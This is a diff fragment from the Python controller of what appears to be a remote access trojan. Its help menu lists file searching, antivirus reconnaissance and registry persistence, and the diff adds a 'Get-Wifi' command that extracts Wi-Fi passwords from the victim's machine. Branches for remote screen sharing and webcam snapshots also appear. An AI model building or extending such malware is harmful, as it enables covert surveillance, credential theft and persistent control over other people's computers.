@@ -410,7 +410,8 @@ def target_communication(target, ip):
                     findfiles                          --> example findfiles|txt|C:\\
                     playsound                          --> play wav file in the background (just .wav)
                     av_recon                           --> Get Infos about Av
-                    persistence *RegName* *fileName*    --> Create Persistence In Registry'''))
+                    Get-Wifi                           --> Get-Wifi Function Extract Wifi Passwords from Client
+                    persistence *RegName* *fileName*   --> Create Persistence In Registry'''))
             elif command[:11] == 'screenshare':
                 upload_file(target, 'scripts\\screenshare.ps1')
             elif command[:11] == "webcam_snap":
